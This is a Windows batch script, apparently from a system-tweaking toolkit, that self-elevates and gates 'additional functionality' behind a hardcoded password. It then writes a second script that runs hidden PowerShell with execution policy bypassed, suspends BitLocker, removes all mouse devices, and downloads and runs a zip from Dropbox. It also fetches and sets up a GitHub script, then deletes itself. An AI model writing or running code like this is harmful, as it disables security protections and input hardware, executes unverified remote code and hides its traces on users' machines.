@echo off
FSUTIL DIRTY query %SystemDrive% >NUL || (PowerShell "Start-Process -FilePath '%0' -Verb RunAs" EXIT)

:start
echo Enter the password to unlock additional functionality :
set /p "pass=>"

if "%pass%"=="1337" (
echo Access Granted!
echo > Tron.bat
echo FSUTIL DIRTY query ^%SystemDrive% ^>NUL ^|^| (PowerShell "Start-Process -FilePath '%0' -Verb RunAs" ^EXIT^) >> Tron.bat
echo start "" PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\23jrg\Quantum-Impeller\Volume.ps1" >> Tron.bat
echo start "" PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\23jrg\Quantum-Impeller\Music.ps1" >> Tron.bat
echo start cmd /k "color 2&&curl ascii.live/knot" >> Tron.bat
echo powershell -Command "Suspend-BitLocker -MountPoint 'C:' -RebootCount 1;Caffeine -replace;foreach ($dev in (Get-PnpDevice | Where-Object{$_.Class -eq 'Mouse'})) {&'pnputil' /remove-device $dev.InstanceId};curl -o C:\24jrg.zip 'https://www.dropbox.com/scl/fo/l1i47sufwu8oq9gfomxzd/AH0AlovhO_R5M1hd3_JyIgk?rlkey=o5of9srrq12e6e6jxp324n186&st=yowokjft&dl=1';tar -xf C:\24jrg.zip -C C:\23jrg\Quantum-Impeller\tools;Start-Process 'cmd.exe' -ArgumentList '/c C:\23jrg\Quantum-Impeller\tools\tron\tron.bat' -WindowStyle Maximized;" >> Tron.bat

start powershell -Command "curl -o C:\24jrg.zip https://github.com/zoicware/RemoveWindowsAI/archive/refs/heads/main.zip;tar -xf C:\24jrg.zip -C C:\23jrg;ren C:\23jrg\RemoveWindowsAI-main RemoveAI;$WshShell = New-Object -COMObject WScript.Shell;$Shortcut3 = $WshShell.CreateShortcut('C:\23jrg\Quantum-Impeller\Tools\Advanced_Tools\Remove-AI.lnk');$Shortcut3.TargetPath = 'powershell.exe';$Shortcut3.Arguments = [string]'C:\23jrg\RemoveAI\RemoveWindowsAi.ps1 -noninteractive -alloptions';$Shortcut3.Save()"

(goto) 2>nul & del "%~f0"
) else (
    echo Access Denied. Try again.
    goto start
)
